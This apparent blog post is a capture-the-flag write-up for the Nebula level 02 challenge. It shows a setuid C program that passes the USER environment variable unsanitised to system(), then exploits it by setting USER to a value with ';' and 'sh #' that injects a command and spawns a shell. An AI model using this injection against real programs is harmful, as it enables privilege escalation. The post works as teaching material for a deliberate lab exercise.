---
author: alvaro
comments: true
layout: post
title: Nebula Level 02
categories:
- Archive
tags:
- security
---

Today we have to deal with the challenge nebula 02. We should find out the vulnerability in the following snippet.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

The first part of the program remains the same as the challenge in nebula 01. If we look the code carefully we can spot quickly when the problem might arise. If in somehow I can trick the program to execute code when it executes `/bin/echo $USER is cool` the work is done.

We have to try that once the program get the value of variable `USER` execute other command. To achieve that we should know a little bit about bash and the solution comes to us quickly.

In bash there is a way to indicate separation between different statements in one line and is using the special character `;`. We can see how the user does not sanitize the value that returns `getenv` so it process the meta-characters as normal characters. So to execute an arbitrary program would be enough to do the next.

```bash
$ USER="level02 ; echo You was pwned ; sh # "
$ ./flag02
about to call system("/bin/echo level02 ; echo You was pwned ; sh #  is cool")
level02
You was pwned
sh-4.2$
```

In that way we got a shell. Maybe you are wondering about `sh #`. That is why without the `#` the string `is cool` would be considered as a file so we put `#` to comment that line. You can try on your own that without `#` you don’t get the shell.

```bash
$ ./flag02
about to call system("/bin/echo level02 ; echo You was pwned ; sh  is cool")
level02
You was pwned
sh: is: No such file or directory
```


{% include twitter_plug.html %}

	